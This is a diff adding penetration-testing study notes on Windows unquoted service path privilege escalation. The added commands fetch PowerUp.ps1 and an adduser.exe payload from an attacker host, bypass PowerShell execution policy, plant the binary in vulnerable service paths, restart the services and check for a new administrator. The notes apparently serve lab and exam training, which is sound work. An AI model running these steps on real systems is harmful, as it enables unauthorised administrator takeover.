@@ -2168,6 +2168,36 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - wait high privilege user login and trigger the dll  
   - check new user created `net user`  
 - 17.2.3 Unquoted Service Paths
+  - PowerUp to identify unquoted service "GammaService"
+    ```
+    iwr http://192.168.45.221/PowerUp.ps1 -Outfile PowerUp.ps1
+    powershell -ep bypass
+    . .\PowerUp.ps1
+    Get-UnquotedService
+
+    iwr -uri http://192.168.45.221/adduser.exe -Outfile Current.exe
+    copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+
+    Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+    Restart-Service GammaService
+    net user
+    net localgroup administrators
+    ```
+  - use wmic to identify unquoted service "ReynhSurveillance"  
+    ```
+    C:\Users\damian> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+    Start-Service ReynhSurveillance
+    Stop-Service ReynhSurveillance
+
+    iwr -uri http://192.168.45.221/adduser.exe -Outfile ReynhSurveillance.exe
+    copy .\ReynhSurveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance Apps\ReynhSurveillance.exe'
+
+    Restart-Service ReynhSurveillance
+    net user
+    net localgroup administrators
+    ```
+- 
+- dsdd  
 
 ## Penetration testing report 
 - note editor:
